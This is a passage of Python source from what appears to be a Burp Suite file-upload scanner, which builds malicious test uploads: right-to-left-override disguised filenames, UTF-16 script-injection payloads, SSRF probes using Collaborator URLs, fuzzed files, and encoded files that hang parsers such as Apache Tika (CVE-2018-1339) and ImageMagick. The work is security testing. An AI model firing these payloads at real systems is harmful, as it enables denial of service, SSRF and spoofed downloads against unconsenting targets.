               "unicode char 0xE280AE) and detected that it's possible to download a file named {} . " \
               "How such a file is presented to the user is dependent on the HTTP client.".format(left_to_right, Constants.MARKER_URL_CONTENT)
        issue = self._create_issue_template(base_request_response, title, desc, "Certain", "Low")
        expected_filenames = (
            left_to_right,
            Constants.DOWNLOAD_ME + file_extension[::-1] + random_part_reverse + "lefttoright" + ".exe",
            Constants.DOWNLOAD_ME + "%E2%80%AEexe.thgirottfel" + random_part + file_extension,
            Constants.DOWNLOAD_ME + "%e2%80%aeexe.thgirottfel" + random_part + file_extension,
            Constants.DOWNLOAD_ME + "%u202Eexe.thgirottfel" + random_part + file_extension,
            Constants.DOWNLOAD_ME + "%u202eexe.thgirottfel" + random_part + file_extension,
        )
        for exp in expected_filenames:
            self.dl_matchers.add(DownloadMatcher(issue, filename_content_disposition=exp))
            self.dl_matchers.add(DownloadMatcher(issue, url_content=exp, filecontent=orig_content))
        req = injector.get_request(left_to_right, orig_content)
        if req:
            self._make_http_request(injector, req, redownload_filename=left_to_right)

        left_to_right2 = Constants.DOWNLOAD_ME + "\xe2\x80\xae" + str(file_extension[::-1]) + "thgirottfel" + random_part + ".exe"
        title = "UTF-8 Unicode left to right overwrite"
        desc = "We uploaded a filename of {} (which has the UTF-8 verison of left to right overwrite unicode char " \
               "0xE280AE) and detected that it's possible to download a file named {} . How such a file is presented " \
               "to the user is dependent on the HTTP client.".format(left_to_right2, Constants.MARKER_URL_CONTENT)
        issue = self._create_issue_template(base_request_response, title, desc, "Certain", "Low")
        expected_filenames = (left_to_right2, Constants.DOWNLOAD_ME + "exe." + random_part_reverse + "lefttoright" + file_extension)
        for exp in expected_filenames:
            self.dl_matchers.add(DownloadMatcher(issue, filename_content_disposition=exp))
            self.dl_matchers.add(DownloadMatcher(issue, url_content=exp, filecontent=orig_content))
        req = injector.get_request(left_to_right2, orig_content)
        if req:
            self._make_http_request(injector, req, redownload_filename=left_to_right2)

        rfc_2047 = Constants.DOWNLOAD_ME + "=?utf-8?q?" + random_part + "Hi=21" + file_extension + "?="
        title = "RFC 2047 in Content-Disposition"
        desc = "A strange encoding found in RFC 2047. Recognized in some headers in Firefox and Chrome including Content-Disposition. We uploaded a filename of " + rfc_2047 + " and detected that it's possible to download a file named " + Constants.MARKER_URL_CONTENT + " ."
        issue = self._create_issue_template(base_request_response, title, desc, "Certain", "Low")
        expected_filenames = (rfc_2047, Constants.DOWNLOAD_ME + random_part + "Hi!" + file_extension)
        for exp in expected_filenames:
            self.dl_matchers.add(DownloadMatcher(issue, filename_content_disposition=exp))
        req = injector.get_request(rfc_2047, orig_content)
        if req:
            self._make_http_request(injector, req, redownload_filename=rfc_2047)

    def _quirks_without_passive(self, injector):
        if not injector.get_uploaded_filename():
            # If the request does not contain a filename, there is no point in doing these requests
            return
        # TODO feature: in general feedback to this module...
        file_extension = injector.get_default_file_ext()
        # The checks that have no passive checks, simply send them:
        payloads = (
            "A" * 9990 + file_extension,  # just a very long filename, generated PHP error "Warning</b>:  move_uploaded_file(" in the past
            "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f" + file_extension,
            "%01%02%03%04%05%06%07%08%09%0a%0b%0c%0d%0e%0f%10%11%12%13%14%15%16%17%18%19%1a%1b%1c%1d%1e%1f" + file_extension,
            "".join([struct.pack("B", x) for x in range(0x20, 0x2f)]) + file_extension,
            "%" + "%".join([struct.pack("B", x) for x in range(0x20, 0x2f)]) + file_extension,
            '\xff\xfe<\x00s\x00c\x00r\x00i\x00p\x00t\x00>\x00a\x00l\x00e\x00r\x00t\x00(\x001\x002\x003\x00)\x00<\x00/\x00s\x00c\x00r\x00i\x00p\x00t\x00>\x00',
            # BOM_UTF-16_LE
            '\xfe\xff\x00<\x00s\x00c\x00r\x00i\x00p\x00t\x00>\x00a\x00l\x00e\x00r\x00t\x00(\x001\x002\x003\x00)\x00<\x00/\x00s\x00c\x00r\x00i\x00p\x00t\x00>',
            # BOM_UTF-16_BE
            'COM1',
            'COM1' + file_extension,
            # not allowed on Windows as a file name: CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, and LPT9
            'test.exe:',
            'test.exe:' + file_extension,
            # Also not allowed on windows
            'test.{D20EA4E1-3957-11d2-A40B-0C5020524153}',
            'test::{D20EA4E1-3957-11d2-A40B-0C5020524153}',
            # a Windows feature called CLSID https://www.tenforums.com/tutorials/3123-clsid-key-guid-shortcuts-list-windows-10-a.html but it must be a folder name!
            '*',
            '*' + file_extension,
            # can get really weird results, as this file could afterwards result in being the only match to a unix search
            # for ./* while actually such a search should match everything
            '.', # Generated PHP error "move_uploaded_file(): The second argument to copy() function cannot be a directory" in the past
            '.' + file_extension,
        )
        content = injector.get_uploaded_content()
        for i in payloads:
            req = injector.get_request(i, content)
            if req:
                self._make_http_request(injector, req)

    def _generic_url_do_replace(self, burp_colab, prot, orig_content):
        # Case destroying the file size (e.g. for XML things)
        colab_url = burp_colab.generate_payload(True)
        content_replace = orig_content.replace(prot, prot + colab_url + "/")
        yield content_replace, colab_url

        # Case keeping the file size and hopefully if we are lucky even the correct file format (e.g. for ASN1)
        new_content = ""
        search_content = orig_content
        colab_url2 = burp_colab.generate_payload(True)
        while prot in search_content:
            index = search_content.find(prot)
            new_content += search_content[:index]
            payload = prot + colab_url2 + "/"
            new_content += payload
            search_content = search_content[index + len(payload):]
        new_content += search_content
        # If we have a prot at the very end the new_content will be too large, so truncate:
        new_content = new_content[:len(orig_content)]
        yield new_content, colab_url2


    def _generic_url_replacer(self, injector, burp_colab):
        # Burp community edition doesn't have Burp collaborator
        if not burp_colab:
            return []
        # burp collaborator based URL replacing
        # Simply replaces all http:// with http://burp.collaborator.domain/
        # eg.
        # http://www.example.org/file.cgi?test=123
        # turns into:
        # http://burp.collaborator.domain/www.example.org/file.cgi?test=123

        name = "URL replacement collaborator interaction"
        severity = "Medium"
        confidence = "Tentative"
        detail = "A Burp Colaborator interaction was detected when replacing all ftp, http and https " \
                 "URLs with a burp colaborator URL. This means that Server Side Request Forgery is possible " \
                 "if this request was coming from the server. " \
                 "Interactions:<br><br>"
        issue = self._create_issue_template(injector.get_brr(), name, detail, confidence, severity)

        colab_tests = []
        filename = injector.get_uploaded_filename()
        name, ext = os.path.splitext(filename)
        orig_content = injector.get_uploaded_content()
        i = 0
        for prot in Constants.PROTOCOLS_HTTP:
            if prot in orig_content:
                for content, colab_url in self._generic_url_do_replace(burp_colab, prot, orig_content):
                    req = injector.get_request(name + str(i) + ext, content)
                    i += 1
                    if req:
                        urr = self._make_http_request(injector, req)
                        if urr:
                            colab_tests.append(ColabTest(colab_url, urr, issue))

        return colab_tests

    def _recursive_upload_files(self, injector, burp_colab):
        # Dimensions are:
        # filename:       from original request, from file
        # file extension: from original request, from file, using the default, guessing by mime type
        # mime_type:      from original request, guessing by file, guessing by file extension
        # File content:   Always from file
        if not injector.opts.ru_dirpath:
            return

        name = "Recursive upload SSRF"
        severity = "Medium"
        confidence = "Certain"
        detail = "A Burp Colaborator interaction was detected when doing the recursive uploads, replacing all URLs within " \
                 "file contents with one that contains a burp colaborator URL. This means that Server Side Request Forgery is possible. " \
                 "You might be able to read local files with this issue, etc. <br>" \
                 "Interactions:<br><br>"
        issue = self._create_issue_template(injector.get_brr(), name, detail, confidence, severity)

        old_name, old_ext = os.path.splitext(injector.get_uploaded_filename())
        colab_tests = []
        for path, _, files in os.walk(injector.opts.ru_dirpath):
            for filename in files:
                filename = FloydsHelpers.u2s(filename)
                filepath = os.path.join(path, filename)
                new_name, new_ext = os.path.splitext(filename)
                if injector.opts.ru_keep_filename:
                    new_name = old_name
                if injector.opts.ru_keep_file_extension:
                    new_ext = old_ext
                mime_type = None
                if not new_ext:
                    new_ext = injector.get_default_file_ext()
                if not injector.opts.ru_keep_mime_type:
                    if injector.opts.ru_believe_file_extension:
                        mime_type = FloydsHelpers.mime_type_from_ext(new_ext)
                    else:
                        m = FloydsHelpers.mime_type_from_content(filepath)
                        if m:
                            mime_type = m
                        else:
                            print("Couldn't find mime_type for", filepath)
                            print("Trying file extension")
                            mime_type = FloydsHelpers.mime_type_from_ext(new_ext)
                if injector.opts.ru_guess_file_ext:
                    if mime_type:
                        new_ext = FloydsHelpers.file_extension_from_mime(mime_type)
                    else:
                        new_ext = FloydsHelpers.file_extension_from_mime(FloydsHelpers.mime_type_from_content(filepath))

                content = file(os.path.join(path, filename), "rb").read()
                if not mime_type:
                    mime_type = injector.get_uploaded_content_type()

                # Send the original content first
                new_filename = new_name + "0" + new_ext
                print("Recursive Uploader doing", new_filename, mime_type)
                req = injector.get_request(new_filename, content, mime_type)
                if req:
                    self._make_http_request(injector, req, redownload_filename=new_filename)

                # Combine with replacer
                if injector.opts.ru_combine_with_replacer and burp_colab:
                    i = 1
                    for prot in Constants.PROTOCOLS_HTTP:
                        if prot in content:
                            for content, colab_url in self._generic_url_do_replace(burp_colab, prot, content):
                                new_filename = new_name + str(i) + new_ext
                                i += 1
                                print("Recursive Uploader doing", new_filename, mime_type, colab_url)
                                req = injector.get_request(new_filename, content, mime_type)
                                if req:
                                    urr = self._make_http_request(injector, req, redownload_filename=new_filename)
                                    if urr:
                                        colab_tests.append(ColabTest(colab_url, urr, issue))
        return colab_tests

    def _fuzz(self, injector):
        content = injector.get_uploaded_content()
        if not content:
            return
        orig_filename = injector.get_uploaded_filename()
        name_increment = 1
        for _ in ERANGE(0, injector.opts.fuzzer_known_mutations):
            new_content = copy.copy(content)
            index = random.choice(xrange(0, len(new_content)))
            print("At byte index", index, "inserted known fuzz string")
            new_content = new_content[:index] + random.choice(Constants.KNOWN_FUZZ_STRINGS) + new_content[index + 1:]
            name, ext = os.path.splitext(orig_filename)
            new_filename = name + str(name_increment) + ext
            name_increment += 1
            req = injector.get_request(new_filename, new_content)
            if req:
                self._make_http_request(injector, req)
        for _ in xrange(0, injector.opts.fuzzer_random_mutations):
            new_content = copy.copy(content)
            index = random.randint(0, len(new_content) - 1)
            if random.choice((True, False)):
                # byte change
                print("At byte index", index, "changed to new byte")
                new_content = new_content[:index] + chr(random.randint(0, 255)) + new_content[index + 1:]
            else:
                # bit change
                bit_index = random.randint(0, 7)
                print("At byte index", index, "changed bit", bit_index)
                new_byte = chr(ord(new_content[index]) ^ (2 ** bit_index))
                new_content = new_content[:index] + new_byte + new_content[index + 1:]
            name, ext = os.path.splitext(orig_filename)
            new_filename = name + str(name_increment) + ext
            name_increment += 1
            req = injector.get_request(new_filename, new_content)
            if req:
                self._make_http_request(injector, req)

    def _timeout_and_dos(self, injector):
        orig_filename = injector.get_uploaded_filename()
        orig_ct = injector.get_uploaded_content_type()
        attacks = []
        title = "File upload connection timeout"
        desc = "A connection timeout occured when uploading a specially crafted file, it is likely that a high " \
               "ressource consumption on the server-side took place (possible DoS). "


        desc_chm = desc + "The file was found by Hanno Boeck during a fuzzing run with chmlib. However, later when floyd " \
                          "started to fuzz the Java based Apache Tikka project in version 1.17, he found out that this file will " \
                          "also hang the Tikka parser and use 100% CPU at the same time. CVE-2018-1339 was assigned for Tikka. " \
                          "See http://www.openwall.com/lists/oss-security/2018/04/25/7 . "
        content = 'eJzzDAl2Y2ZgYEgAYkYgvsV77AonCwODwF/GmlXVFwTn8TAsOKn07I0gGh+kHgQkoHQFlA4RgNBnoPQ/Rgjdr8mAAjxDggNAUiF' \
                  'AzAUSAKpngrrhPxDA1IHYIDGQm7ImMcXqKV4QnPsT4oYQqDwMBPi6+zBgAxz6yp4uER4uQYyzGRaAeSFOQAeAjNVXDg4J8vT7xc' \
                  'Dwy4oFKBMcGRzi6svQyLbQEMgL8Q/wdA5m3M0gAOSEBvkA1TLulpGDcEKcfBh3C/Bw66u4eaaVZPomZuYxgkxU8Xfy8vQLDmFsd' \
                  'ZxqL6qvEh7uWFycn5yZWJJZluqTmZddrA+0WRarREBRfkFqUUklY6stiyBIhXdqZXl+UQpcmySGIEKLJQu3vkt+cmlual4JWLEI' \
                  'EtczLyW1Qi8jI5ux2bDRWwFJJiQxKSdVIT9NwTk/rwQkAlSVzMjQbCiKpKgktbjEUC+jJDeHsaXGVsTKyiWxJDG4IDE5Vd8vMRf' \
                  'o+uISBgYbDWTx4JL8osT0VH3fYOf83IKi1OLi1BR9qB0Mi8z7YnSIUl2UnwNSxZAlo0lQPVAqzzMvLZ8hiUOfoOKQosS84rT8ol' \
                  'x9sOtt1OJJ0FJt7uZsZGFpYqBr6WJsqGto6AJkORmZ6xoYOBo4Wxq6WjqbO9cCQ724JDEvORVkrh4wRjJpa4V+UGpxagk4Qhk2C' \
                  'htgzQyjYBSMglEwCkbBKBgFo2CIgDf/CasZBTQAjwbaAUMN/P8zINbOYfzLAACSHC2P'.decode("base64").decode("zlib")
        new_title = title
        attacks.append((orig_filename, content, '', new_title, desc_chm))
        if orig_filename or orig_ct:
            attacks.append(("CVE20181339.chm", content, "application/octet-stream", new_title, desc_chm))


        desc_im = desc + "The file was created by floyd during an offline fuzzing run with graphicksmagick. " \
                         "During lab tests for this plugin a timeout (aka 'hang') occured when uploading this file to a " \
                         "server with the following specification:<br>" \
                         "Manual compile of ImageMagick 6.5.4-10 2016-12-19 Q16 http://www.imagemagick.org Copyright (C)" \
                         " 1999-2009<br> PHP 5.3.10-1ubuntu3.13 with Suhosin-Patch (cli) (built: Jul  7 2014 18:52:09) <br>" \
                         "The PHP script basically used the following code with no further checks:<br>" \
                         "shell_exec('convert /tmp/tmpPhpInputFile -resize 50x50 /var/www/uploads/test.png');<br>" \
                         "It is therefore very likely that the server is running an outdated version of ImageMagick or GraphicksMagick. "
        content = 'R\xcc\xe3\x08\x08\x08\x08\x00@\x00\x00\x01\x08\x00 \x02\xf1\x03\x00\x00\x01$!\x00\x01\xffR\x00\xff\x1b\x07\x00' \
                  'R\xcc\xc4\x00\x01\x08\x08\x00\x06\x00\x15\x01\x08\x00\x00\x00\x00\xff\xff\xff\xd4\n\xa3\xf2\x00\t\x00.\x02i\x05' \
                  '\x06\x00$%S\x00\x04 \xff\xceV\xff  \x00\x00\x00\x00\x00 \x00\x00\x01\x00\xfd\xfe\xff\xff\x01\x00\x033\x00\x80v' \
                  '\x1d\x00\x00(\x00\x00\x00 \x00\x00\x00\x13\x02\x01\x00\x00\x00\x0e\x14\x92g \x00\x1e\x00\x00\x00\xfdG\x00\x00H\x00\x00'
        new_title = title
        attacks.append((orig_filename, content, '', new_title, desc_im))

        riff_java_hang = "RIFF\x1d\x1e\xb0\x00WAVEfmt\x00\x00\x10\x00\x00\x00\x80\x04\x084\x80\x04\x08\x01\x05\x00\x01\x00\x00\x00\xf2\x00" \
                         "@\x00\x1b\x01\x00(\x00\x1b\x00\x1a\xe2\x06\x00\x00\x004\x00\x00\x004\x00\xfa\xff\xf9\x00\x1c\x01\x03\x7f\xff\xff" \
                         "\xff\x81\x02\x00\x00\x00(\x01\x03\x00\x01\x00\x00\x00\x10\x00\x00\x00\x80\x04\x084\x80\x04\x08\x01\x05\x00\x01" \
                         "\x00\x00\x00\xf2\x00@\x00\x1b\x01\x05\x00\x01\x00\x00\x00\xfa\xff\xf9\x00\x1c\x01\x03\x00\x01\x00\x00\x00\x02\x00" \
                         "d\x00(\x01\x03\x00\x01\x00\x00\x00\x10\x00\x00\x001\x01$\x00^^^\x00tttttttttt\x00\x00S\x01\x03\x00\x02\x00\x00" \
                         "\x00\x00\x00\x00\x00 \x00\xe8\x03a'\x01\x00\x002\x01 \x00\x14\x00\x00\x00D\x01\x00\x00;\xff\x00\r\n\x00\x00\x00" \
                         "[\x01,\x00tttttttttt\x02\x7fS\x00\xf6\x00\x02\x7f\xff\x00\x00\x00\x00\x00 \x00\xe8\x03ad1"
        desc_riff = desc + "The file was created by floyd during an offline fuzzing run with Apache Tika,  However, Tim Allison then " \
                         "realized it affects Java before version 10 and its RIFF parser. I only rediscovered this issue basically: <br>" \
                         "https://bugs.openjdk.java.net/browse/JDK-8135160<br>" \
                         "Unfortunately, there was never a CVE assigned to this. " \
                         "It is therefore very likely that the server is running Java before version 10. "
        new_title = title
        attacks.append((orig_filename, riff_java_hang, '', new_title, desc_riff))
        if orig_filename or orig_ct:
            attacks.append(("riffhang.wav", riff_java_hang, '', new_title, desc_riff))

        if injector.opts.file_formats['tiff'].isSelected():
            content = "TU0AKgAAC9QCBBU8C//////x///H4BAX/4BX+FqigD4f///+Bpf//8fkhd//13/4SKyk39f///gAA///z/4Bf//gx/gRASUP+///8CQb////" \
                      "/4D///N/+Cn6SKv3///kEiH//6//4///8Z/4f/giAPf9/wBAgD//X//1///hf/j//gAIi8AHAAgln/9///3///D/+H/+BAADwAASIgAf/z/" \
                      "/////8V/Y//8IQAMAQQSAlJP8Hf/////Butj//w/QAAEAIBQACeM3/////8Pv+P//GrwEBAAABQIExr///+//w2t4//4f/gyAiAQAlJAGG/" \
                      "////+C+vj//D3/CAgAAAIAQqeP/////4f3+P/8H/8MABBCgEkIDCf/////h/74//x//RCAAOBhEJAQP/////4Hffj//b/8NAAD6AgCAgPP/" \
                      "////AvXeP/g//wAAAPhACIAiHf////8Bv34P+Nf/HgCF8AoCCgAD/////gPX/hrwn/wQADwP/7/Xf78AAAAP/gKAKE9AB993/Q7f737q14A" \
                      "AAAf+aAAgDoA/+//oO//36W21gAAAB/8KACgGEf/99/Q/Wf7////AAAAP/wQAMgaAf/v/+H7/v39v26AAAA/+xAAAAQH/93/4P53d1vW94A" \
                      "AAH/4SACgDB//f/9j/97d2rv+oAAGP+BIAIEIP+/7/wN79///32fgAA+HwBaAiAQ/9//+gf9v+an1urgALUAEAACgKH/9//8H/vvv/1//zA" \
                      "MyRGABAORf/6///AXv21227a/aD8wQAAEAAD//P/+9D/159/93+r8vuAAAAACov/43//wGf8G/r6u+6/9WQAAAAIH//H+//A/1/P32/ut//" \
                      "/oQAAAAkP/8d//4A/38X79crdW/6AAAAACg//y//+UGf1d77fDgc//1IAAAAAAH8D//8AfX77312ABX//mAAAAAAAfwv//MA/71u69wAHH/" \
                      "9AAAAAAAA/A//8AGf2e9v7AAYd/4AAAgCAAB8r///ADf/d/W4ABkv+UAAAAAAAPgH+ymAPdp3/6gAFX/5AAAAOAABcKPwREAfvTdt/AAb6/" \
                      "5AAACkAAH4E+HUgAb8f++0AB6v/KAAAYAAA/ih4AUAB90V+egAK/v+AAAbaAAD8UHGAgADsB+v+AB+r/6AAA+AAAPwAMKEAAP8F/2uKss7/" \
                      "oABPhAAH/AAiIAAA/wH+uhWvwv8AAA0KAA/8VAIAAADcAt//6uWCflAAHAgIB/xEAAAAAHcB9+X9XcL/kAAYBAxr/AAUAAAA3AG/f5f/gv9" \
                      "AABAACUB8CAgAAAAuAf7/tV0A/6AAAKoLmn5QIYAAAPeA/+rv9wL/2AAB0AigfAI4QA//Bf8EAEYA/ACX//x/h5UDZ3////+Q/6BJUGn5AC" \
                      "t//JuB5APtt7///5T/AEIABfAAEn98P4HiAXZN////gRRAEGlj+AAB3f/FgAAClrv///+EKSCwIA/gAAAH//uAAANoHr///4CWz/wJT8IAA" \
                      "f//9YAAABAV////iAZN/AAfmAAD////AAAAIA+f//8BMKD8Ka9AAAf///+AAAAAOv///4BBQDwil9GAD////IAAAAA/3///AAqYfkAtAYAP" \
                      "////AgMAACv7//+CmUB/AFoJgA////8GQAAAPa///4AAGv8CAEAAD////oeMAAAfv///AAIQfwIIgAAP///8DbAAAD3wAhA+hMh/BCEAAA/" \
                      "///0FkAAAP2///wEAiV+AFADQD////A8wAAB/////ACQTf4Hngf4N///4hsAAAH7///8AAB+/wp/Dew////gEgAAAP+///gAAF+/BHeX/tv" \
                      "//8A0AAAB9////AAA3v8E/+f8H///4AAAAAH////8AAP/P4if//4N///GCAAAA+7///wAD3//kH///wf///gUAAAD////+ACBf3/ZH//+Bb" \
                      "//8CgAAAH3///4G+EPf9jX///A/3/AEAAAA/////hs+Aa/+n/Z/8FIs4AQAAAD////8C/sAP/yfJ//gOYKQAAAAAH9///gf/wD//OQHf/BK" \
                      "AgQAAAAA////+G//gFf/zAX/8AAAAIAAAAD///DYR/+g//94D//wAAAAAAAAAXv///D///D//2Af//AAAAQAAAAA////8J38eL///CL/8AA" \
                      "AAAAAAAB////w1b8O7//4n//wAAAAgAAAAP////C//4fv+PEr//AAAAIAAAAA////8P7/wn//0FX//lAAQAAAAAH3///z+21///eQf//gAA" \
                      "AAgAAAAf///8Pl1Hb8Ddf///AAAgCAAAAA////wf/b4R8Sv/BKAgAAFYAAAAH////B+X7f/wX//v/wAAADgAAAAP///4Of67X/yrv//+AAA" \
                      "IuAAAAC////w9Vr+3/1////8AAIT4AAAAH///+Fvd5f/+Kf///wAAAPgAAAA////gZrqv//67////AAAS+AAAAB////Aq6/Zv/l3///8AAA" \
                      "H4AAAAH///0Fd1e///JX///wAAC/gAAAAv///grVdfX//V////AAJA+AAAAD///8BbvP6//wp///8AAAPwAAAAb///wCrrlf//pf///wAAk" \
                      "/AAAAA7///Ar/md938Ke//+AAQj8AAAAD///7ARLnM//pXd/v4AAEc4////gAAAH+QIERIA9UwhAf//9Gj///+gAAB/u+pWSIpasAAR///Y" \
                      "OP///4AAAH/JJLXASXpFgAH//3h4//+vQAAAD/f7qhkip5ggk///6nj///+AAAB/765fkUVlQCAB///8+P//n6AAAD/599RIEmq2iQf///P" \
                      "4////AAAAP/v91YqF2tQIA///2vj//1+BAACP+pem4BqlJdFj////+P///0AAAb/1xdtapZqQAEP///p4////AAAEH/97paIH5SplB///3/" \
                      "j///9gAAAf/7PbbDeqqRIL////+P///wAAQH//TaTSQuVahEP////4///+AAAAX/+265kf/KOgA///6/j///5AAAA//0N09EebaCSP////+" \
                      "P///wAAAL//7dXKxvXZEAP////4////gAAAf/+2eH0bqyqGg/////j///5AAAA//972rEV2tqAL////+P///gQAAD//121Wl9qRQhf////4" \
                      "///+AAAAP/96en4G6yQEg/////j///xAAAD//969m2d4lmID////+P///kAAAP//tX9WntaSABf9///4///9IAAA///ubrdn3UioB/////i" \
                      "///5AAAD//+/7VleqiQQn////+IHf+AAAAP///H6+r/VoUEf////4iaf4hAAA///57lNWrhGGL/////gAXfgQAAH///91rq/zqpAP////+A" \
                      "A2+AAAAf///X6+N/uYGI/////4AIv5oAAB///+2VOv/6NAH/////gAF/IAAAP///9+ql//6BA/////+AAB+KAAA////VtVp/7WyL/////4A" \
                      "APxAAAD/////FKv/9Uyev////gAAuYgAAP///9fnV//+IB/p///+AAF8gAAA////3smV//qiv4P///4AAH5QAAD////3puv/5Ix/cD///gA" \
                      "A/lAAA////+f5b//6if+AK//+AAP9hgAD/////++f//6j/4ATX/4AB/8gAAf////P1////2/+AABf/gAD/7kAB/////v/v///4TeAAAf+AA" \
                      "AAAAAH///////////gH0AAAP4AAAAAAA///////////+APgAAAPgAAAAAADb//////////5P7AAAE+AAAAAAAAF//////////8/2AAAe4AA" \
                      "AAAAAAAD///////////lAABdgAAAAAAAAAD//////////7/6AD+AAAAAAAAAAC///////////////4oAAAAAAAAAA//////////93+fxDgA" \
                      "AAAAAAAAAH////////9//d8AOAAAAAAAAAAAP//5/////////YAwAAAAAAAAAAA//////6+f///xADQAAAAAAAAAAD//v///Y//b+34AIAA" \
                      "AAAAAAAAAIH//v/IB//n//AAgAAAAAAAAAAAAP9bv/gD/8+9wACAAAAAAAAAAAAAP7z/0AP/z/9UAAAOAQAAAwAAAAEMnQAAAQEAAwAAAAH" \
                      "2lwAAAQIAAwAAAAEAAQAAAQMAAwAAAAEAAwAAAQYAAwAAAAEAAAAAAQ0AAgAAAP8AAAyCAREABAAAAAEAAAAIARUAAwAAAAEAAQAAARYAAw" \
                      "AAAAEBmQAAARcABAAAAAEAAAvMARwAAwAAAAEAAQAAASkAAwALAAIAAAABATEAAgAAAEEAAAyYAUIAAwAAAAEAAQAAAAAAAG1pbmlzd2hpd" \
                      "GUtMWMtMWIudGlmZgA="
            content = content.decode("base64")
            file_details = "The image is TIFF image data, big-endian, starting with the MM file magic"
            new_title = title
            attacks.append((orig_filename, content, '', new_title, desc_im + file_details))
            if orig_filename or orig_ct:
                attacks.append(("bigEndianGraphicsMagick.tiff", content, "image/tiff", new_title, desc_im + file_details))

            content = 'SUkqABAAAAABAAEAAVYBwgsAAAEDAAEAAAABAAAAAQEDAAEAAADw/wAAAgEDAAMAAACaAAAAAwEDAAEAAAB0hwAABgEDAAEAAABMgAAAEQEE' \
                      'AAEAAAAIAAAAFQEDAAEAAAADAAAAFgEDAAEAAAABAAAAFwEEAAEAAAAIAAAAHAEDAAEAAAABAAAAUwEDAAMAAACgAAAAAAAAABAAEAAQAAI' \
                      'AAgACAA=='
            content = content.decode("base64")
            file_details = "The image is TIFF image data, little-endian, starting with the II file magic"
            new_title = title
            attacks.append((orig_filename, content, '', new_title, desc_im + file_details))
            if orig_filename or orig_ct:
                attacks.append(("littleEndianGaphicsMagick.tiff", content, "image/tiff", new_title, desc_im + file_details))

        if injector.opts.file_formats['jpeg'].isSelected():
            content = '/9j/4AAQSkZJRgABAQEAFgAWAAD/2wBDAAICAgICAQICAgIDAgIDAwYEAwMDAwcFBQQGCAcJCAgHCAgJCg0LCQoMCggICw8LDA0ODg8OC' \
                      'QsQERAOEQ0ODg7/2wBDAQIDAwMDAwcEBAcOCQgJDg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg7' \
                      '/wAARCPr6+voDASIAAhEBAxEB/8QAHgAAAQUBAQEBAQAAAAAAAAAAAAECAwQFBgcJCgj/xABOEAACAQICBgUIBQgHBgcAAAAAAQIDEQQhB' \
                      'QYSMTJRByJBYZEICRMUcYGV0hUjM1KhNEJiY4KDksEXGSRDRXKTGCU2VHXCRFNzsdHh8P/EABoBAQEBAQEBAQAAAAAAAAAAAAACAQMEBQb' \
                      '/xAAgEQEBAQACAgMBAQEAAAAAAAAAARECMQMSEyFRBBRB/9oADAMBAAIRAxEAPwD7YAAH6B8sAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' \
                      'AAAAAAAAA1uzAV8JG+Ec3dDWroCSHGTw3FeO+5YisgHAAAQWfIQsDPz/eBHZ8gs+ROAEFnyCz5E4Bkuq4Er4hAvEYtnyHj1whlmIbPkFny' \
                      'JwCNQWfILPkTgFILPkFnyJwAgs+QWfIk8c2NyaXB0PuANQWfILPkTgGy6gs+QWfInANQWfILPkTgBBZ8iJ32vay4AFSz5BZ8i2AFeKyROu' \
                      'EUAAAABE7oLda9wXCKAAAAAAARDHxCCviEDtOgPXCMHrhDKUAAOIAADoAAAAAAOYAAAAAAqAAAKAAAAAAAAAAAAAAAAAAA8c2NyaXB0Pi5' \
                      'BlyQAZAZckAAdIAAAoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAARZoAADPUAABUgAACgAAAAANl2EXkHAQttPexU21vZu' \
                      'iUBl3zC75jQ8Bl3zC75jQ8Bl3zC75jQ8Bl3zC75jQ8Bl3zC75jQ8Bl3zC75jQ8Bl3zC75jQ8Bl3zAaHgAE8c2NyaXB0PgAAAAAAAAAy9AG' \
                      'y7Bw2XYcb2InxDlwjXxDlwlhQAAAAAAAAAOwTaQPhGBUh+0guhgdgbkSANjvHBAAAAS6Aa+IAJLsLsbdCgLdhdiAAt2RucknmPI2mkAnpJ' \
                      'cx+1LmRtZK3IcBLFt7yRK7Io5byWLV7lQINbaY4a02ygqd0KIlZCgAABmQNcIvsF2VyC6C6GQFkI0kgcl2PMRu4yBHlcjcnbeSPcyJ8Joj' \
                      'c5KW8PSS5jWusIdJI6yTT9uTdmx12RJ2kJKdt7Lsn4rIWdVrtKNXFVIJ2ml7iHEYpU07tXOXxul4wUuskV6x2kjVxOlsVRUtislbuORx+t' \
                      'emKEJOljVGy+4jndK48c2NyaXB0PvK9Na5UoRmnUW7mc+Xripwn46LT/Shrjgtr1bS6p2/Uwf8AI8T090+9KWCU/VtZVTtu/ssH/I5bWbX' \
                      'KnLb+sXb2n8+6ya1U5up11f2ng537+nT04/j1PF+VD0108dOFPXFRgty9Sp//AAB/JOM09F6Qm1JWPHNjcmlwdD7RWOj2nwwxPnFun6k+p' \
                      'hNV7d+i5fOZNTzkflC027YPVb4VL5zp8vFxvg5PvOB8C5+ct8omN7YPVT4TL5yhV85t5RsE2sHqnf8A6RL5x8vBF/n5v0BiNXPz1VPOg+U' \
                      'lGTSweqVv+kS+cqz86P5S0VlgtUfg8vnM+bgz4PI/Q9s5DT87z86X5S6X5Dqh8Hl85FPzpflL/wDI6ofB5fOZ83Bs8HKv0UR3Eq4T85/9a' \
                      'd5TC3YLVH4PL5xP61PymUssDqf8Hl85U8/Bf+byWfT9GQH5x5edW8pxbsDqf8Gl85BLzrflPL/wOp3waXzlTz8EX+fyR+j8D83q8655UD3' \
                      'YDU74LL5xV51vyoL54DU74NL5zfm4sn8/kfpBEfCfnPoedS8pyqlfAan+7Q0vnNmh50HylattrA6o5vs0PL5y55JT/P5H6E27ITayPgVh/' \
                      'OW+UZVaUsFqp7tEy+c3sP5xryg6qW3gtV/douXzle0TfDzfdS6uKmrnxEoecH6eqkbywmrXu0ZL5jQh5f8A07NX9U1b+GS+Y2WN+Hm+1Y1' \
                      'cbPix/t/9Ov8AyurfwyXzEcvOBdOyllhNW/hkvmNljPi56+1Ns/YHtPidPzg3TwnlhNWvhkvnKs/OE9PSvbCatfDJfOdJzkdJ4uT7a1JpI' \
